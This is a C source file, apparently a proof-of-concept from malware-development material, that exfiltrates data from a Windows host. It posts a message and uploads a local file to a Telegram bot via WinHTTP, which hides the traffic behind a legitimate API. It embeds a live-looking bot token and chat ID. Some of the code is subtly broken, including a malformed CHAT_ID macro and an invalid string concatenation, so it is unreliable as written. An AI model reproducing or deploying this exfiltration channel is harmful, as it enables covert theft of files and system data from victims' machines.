/*
 * hack.c
 * sending systeminfo via legit URL. Telegram API
 * author @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>

#define TOKEN "8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ"
#define CHAT_ID = "5547299598";

// send data to Telegram channel using winhttp
int sendToTgBot(const char* message) {
  const char* chatId = "5547299598";
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;

  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (hSession == NULL) {
    fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
    return 1;
  }

  hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect == NULL) {
    fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hSession);
  }

  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (hRequest == NULL) {
    fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
  }

  // construct the request body
  char requestBody[512];
  sprintf(requestBody, "chat_id=%s&text=%s", chatId, message);

  // set the headers
  if (!WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", -1, requestBody, strlen(requestBody), strlen(requestBody), 0)) {
    fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hSession);

  printf("successfully sent to tg bot :)\n");
  return 0;
}

// send file to Telegram channel using WinHTTP
int sendFileToTgBot(const char* filePath) {
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL;
  HINTERNET hRequest = NULL;

  const char* url = "https://api.telegram.org/bot" TOKEN "/sendDocument";
  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (hSession == NULL) {
    fprintf(stderr, "WinHttpOpen failed: %lu\n", GetLastError());
    return 1;
  }
  hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (hConnect == NULL) {
    fprintf(stderr, "WinHttpConnect failed: %lu\n", GetLastError());
    WinHttpCloseHandle(hSession);
    return 1;
  }
  hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot" TOKEN "/sendDocument?chat_id=" CHAT_ID,
                  NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

  if (hRequest == NULL) {
    fprintf(stderr, "WinHttpOpenRequest failed: %lu\n", GetLastError());
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  const char* boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
  FILE* file = fopen(filePath, "rb");
  if (!file) {
    fprintf(stderr, "Error opening file: %s\n", filePath);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  fseek(file, 0, SEEK_END);
  long fileSize = ftell(file);
  rewind(file);
  char* postData = NULL;
  size_t postDataLen = snprintf(NULL, 0, 
                  "--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"test.pdf\"\r\nContent-Type: application/octet-stream\r\n\r\n",
                  boundary) + fileSize + strlen("\r\n--" boundary "--\r\n") + 1;
  postData = (char*)malloc(postDataLen);
  if (!postData) {
    fclose(file);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    fprintf(stderr, "Memory allocation failed!\n"); //Improved error handling.
    return 1;
  }
  size_t bytes_written = snprintf(postData, postDataLen,
                  "--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"test.pdf\"\r\nContent-Type: application/octet-stream\r\n\r\n",
                  boundary);
  fread(postData + bytes_written, 1, fileSize, file); //Read file content directly into postData
  fclose(file);     
  bytes_written += fileSize;
  snprintf(postData + bytes_written, postDataLen - bytes_written, "\r\n--%s--\r\n", boundary);  // Boundary end

  char header[256];
  snprintf(header, sizeof(header),
       "Content-Type: multipart/form-data; boundary=%s\r\n"
       "Content-Length: %zu\r\n",
       boundary, strlen(postData));

  if (!WinHttpSendRequest(hRequest, header, -1, postData, (DWORD)strlen(postData), strlen(postData), 0)) {
    fprintf(stderr, "WinHttpSendRequest failed: %lu\n", GetLastError());
    free(postData);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  free(postData);

  DWORD statusCode = 0;
  DWORD statusCodeSize = sizeof(statusCode);

  if (!WinHttpReceiveResponse(hRequest, NULL) ||  //Check if response was received successfully
    !WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
              WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {

    fprintf(stderr, "Error getting response: %lu\n", GetLastError());
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  if (statusCode == 200) {
    printf("File sent successfully.\n");
  } else {
    printf("Failed to send file. HTTP Status Code: %d\n", (int)statusCode);
  }

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);

  return 0;
}

// get systeminfo and send to chat via tgbot logic
int main(int argc, char* argv[]) {

  // test tgbot sending message
  char test[1024];
  const char* message = "meow-meow";
  snprintf(test, sizeof(test), "%s", message);
  sendToTgBot(test);

  // test sending file
  const char* filePath = "test.pdf";
  int result = sendFileToTgBot(filePath);

  if (result == 0) {
    printf("file sent successfully =^..^=\n");
  } else {
    printf("failed to send file :(\n");
  }

  return 0;
}